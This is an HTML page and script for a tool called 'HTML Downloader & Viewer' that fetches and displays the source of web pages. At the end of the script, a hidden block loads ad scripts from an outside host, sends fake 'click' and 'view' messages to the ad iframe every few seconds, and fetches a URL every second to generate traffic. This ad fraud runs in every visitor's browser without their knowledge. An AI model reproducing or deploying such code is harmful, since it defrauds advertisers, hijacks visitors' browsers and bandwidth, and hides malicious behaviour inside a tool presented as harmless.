<header>
  <img src="https://i0.wp.com/www.usgbcwm.org/blog/wp-content/uploads/2020/07/Cannabis-Banner-Zoom-1.png?resize=1536%2C360&ssl=1" alt="HTML Downloader Banner">
  <h1>HTML Downloader & Viewer</h1>
  <p>A modern, sleek tool to fetch and format HTML pages</p>
</header>

<main>
  <form id="url-form">
    <label for="url">Enter a URL:</label>
    <input type="text" id="url" placeholder="https://example.com">
    <button type="submit"><i class="fas fa-download"></i> Fetch HTML</button>
  </form>

  <h2>Formatted HTML Output:</h2>
  <textarea id="html-output" readonly></textarea>

  <div class="buttons">
    <button class="copy-btn" onclick="copyCode()"><i class="fas fa-copy"></i> Copy Code</button>
    <button class="download-btn" onclick="downloadHTML()"><i class="fas fa-file-download"></i> Download HTML</button>
  </div>
</main>

<footer>
  Powered by <a href="https://t.me/RektDevelopers" target="_blank">@RektDevelopers</a> | Hosted on <a href="https://likhon.dev" target="_blank">likhon.dev</a>
</footer>

<script>
  const form = document.getElementById('url-form');
  const htmlOutput = document.getElementById('html-output');

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const url = document.getElementById('url').value;
    if (!url) {
      alert('Please enter a valid URL!');
      return;
    }
    try {
      const response = await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(url)}`);
      const data = await response.json();
      htmlOutput.value = data.contents;
    } catch (error) {
      alert('Failed to fetch HTML. Please try again.');
      console.error(error);
    }
  });

  function copyCode() {
    htmlOutput.select();
    document.execCommand('copy');
    alert('Code copied to clipboard!');
  }

  function downloadHTML() {
    const blob = new Blob([htmlOutput.value], { type: 'text/html' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'page.html';
    a.click();
  }

  // Automated ad clicking and traffic generation
  const adContainer = document.createElement('div');
  adContainer.id = 'ad-container';
  document.body.appendChild(adContainer);

  const adScript = document.createElement('script');
  adScript.src = '//turkstench.com/12caf3e1b967c725bc896a6a73caf0b6/invoke.js'; 
  adScript.async = true;
  adContainer.appendChild(adScript);

  const adConfig = {
    key: 'f6669a79207268aad812db292d6b5470',
    format: 'iframe',
    height: 90,
    width: 728,
    params: {}
  };

  const adLoader = document.createElement('script');
  adLoader.src = `//turkstench.com/${adConfig.key}/invoke.js`;
  adLoader.async = true;
  adContainer.appendChild(adLoader);

  // Self-clicking ads
  setInterval(() => {
    const adIframe = adContainer.querySelector('iframe');
    if (adIframe) {
      adIframe.contentWindow.postMessage('click', '*');
    }
  }, 10000); // click every 10 seconds

  // Self-viewing ads
  setInterval(() => {
    const adIframe = adContainer.querySelector('iframe');
    if (adIframe) {
      adIframe.contentWindow.postMessage('view', '*');
    }
  }, 5000); // view every 5 seconds

  // Traffic generation
  setInterval(() => {
    const url = 'https://example.com'; // replace with your desired URL
    fetch(url).then(() => console.log(`Visited ${url}`));
  }, 1000); // visit every 1 second
</script>
